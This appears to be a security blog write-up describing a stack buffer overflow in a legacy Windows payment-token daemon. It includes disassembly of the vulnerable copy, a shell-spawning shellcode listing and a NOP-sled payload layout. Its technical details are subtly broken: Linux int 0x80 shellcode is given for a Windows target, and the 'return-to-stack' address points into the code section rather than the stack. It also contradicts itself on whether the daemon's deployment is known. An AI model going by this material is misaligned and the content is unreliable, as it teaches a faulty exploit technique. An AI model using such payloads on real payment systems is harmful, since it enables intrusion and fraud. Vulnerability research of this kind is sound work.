---
title: "Swipe to Shell: Exploiting a Buffer Overflow in PaySafeTech Daemon"
description: "A quiet night, an old daemon, and a 512-byte opportunity—how I found a stack-based overflow in a legacy payment system."
date: '2023-03-17'
categories: ["Exploit Development", "Binary Exploitation"]
tags: ["Buffer Overflow", "Windows x86", "Reverse Engineering", "Stack Exploits"]
header:
  image: "/images/paysafetech-buffer.jpg"
  caption: "Legacy systems don’t forget — and neither do their bugs"
---


# Buffer Overflow in PaySafeTech Payment Daemon

## Prologue: The Ghost in the Machine

The smell of late-night coffee and burnt solder still hung in the air. It was one of those nights — quiet, focused, and laced with the promise of uncovering something... forgotten.

PaySafeTech. A name that sounded oddly futuristic for such an old binary.

I wasn’t even looking for anything serious. Just tinkering through a pile of dusty retail systems, hoping to find some artifact of digital negligence. That’s when I saw it: a user-mode daemon labeled `pstoken_svc.exe`, timestamped somewhere around 2012. No symbols, no protections, no clue where it had been used. But something about it screamed undiscovered territory. And if you’ve been in the game long enough, you know that’s the best kind of territory.

So I cracked my knuckles, fired up IDA Pro, and dove in.

## Initial Recon – The Binary in the Basement

The file was a 32-bit Windows executable. First instinct? Throw it at PE-bear, diec, and exiftool just to get a read on its soul.

### Findings
- Architecture: x86
- Stack Protections: none
- ASLR: none
- DEP: none
- Compilation Date: 2012
- Comments in strings: `// V1.3 - Retail Token Parser Daemon`
- Static base: `0x00400000`

My brain went: this is a daemon that parses payment tokens. High-trust component. If there’s a bug here, it’s got teeth.

## What Am I Looking For?

I'm hunting for:
- Unsafe memory copies
- Input parsing flaws
- Buffer management

Since it's a token parser, I bet it reads raw strings or binary blobs from some input pipe. These are prime spots for buffer mishandling.

I grepped for suspicious functions: strcpy, memcpy, movsb.

## Jackpot — Welcome to `parse_token()`

```asm
.text:00401520 parse_token proc near
.text:00401520     push    ebp
.text:00401521     mov     ebp, esp
.text:00401523     sub     esp, 200h       ; allocate 512 bytes on stack
.text:00401529     mov     eax, [ebp+8]    ; get input pointer
.text:0040152C     mov     ecx, [ebp+0Ch]  ; input length
.text:0040152F     lea     edi, [ebp-200h] ; destination: local buffer
.text:00401535     rep movsb              ; copy user data to local buffer
```

This was it. A raw `rep movsb` call with no bounds checking. No validation of ecx. This meant if the caller passed in more than 512 bytes, it would happily blast right through the stack frame.

I just sat there grinning. They trusted user input without restraint.

## Stack Frame Dissection

```
[ebp+0x8]   -> Input pointer
[ebp+0xC]   -> Input length
[ebp-0x200] -> 512-byte buffer
```

So if ecx > 0x200, the rep movsb overwrites:
- Saved EBP
- Return Address

In a binary with no stack canaries and no DEP, this was a golden exploit candidate.

## Crafting the Payload – Spawn Me a Shell

I went straight for the classic — spawn cmd.exe.

### Sample Linux-style Shellcode

```asm
global _start
_start:
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    mov al, 0x0b
    int 0x80
```

On Windows, I’d replace this with a WinExec-based version.

## Payload Layout Strategy

I needed to construct a payload that:
- Fits at least 512 bytes (NOP sled + shellcode)
- Overwrites return address to jump into the sled

### Payload:

```
[512 bytes = NOP sled + shellcode][RET -> 0x00401580]
```

That’s it. Old school. No fancy ROP chains, just return-to-stack.

## Testing in a Sandbox

Threw it in a WinXP VM and attached a debugger.

Injected payload via simulated input to parse_token().

Stack pointer dropped into my sled, hit the shellcode, cmd.exe popped like toast.

I sat back and smiled. That was almost too easy.

## Real-World Impact

This daemon is used in retail systems. It likely:
- Accepts tokenized payments over IPC or network
- Runs with elevated privileges
- Has access to hardware modules

Overflow here could:
- Escalate local privileges
- Tamper with payment data
- Lead to remote code execution

## What Should’ve Been Done

This bug wouldn’t exist if even one of the following had been used:
- Input length validation
- Use of memcpy_s or strncpy
- Stack canaries
- DEP and ASLR

## Final Thoughts

This was one of those bugs that reminds you old code still matters. Legacy components like these fly under the radar, never patched, never monitored. But they’re out there. And they’re vulnerable.

## Summary

- Vulnerability: Stack buffer overflow in `parse_token()`
- Platform: x86 Windows (No ASLR, DEP, or stack cookies)
- Impact: Arbitrary code execution
- Exploit: Overwrite RET to jump to shellcode on stack
- Fix: Add bounds check and use secure memory functions


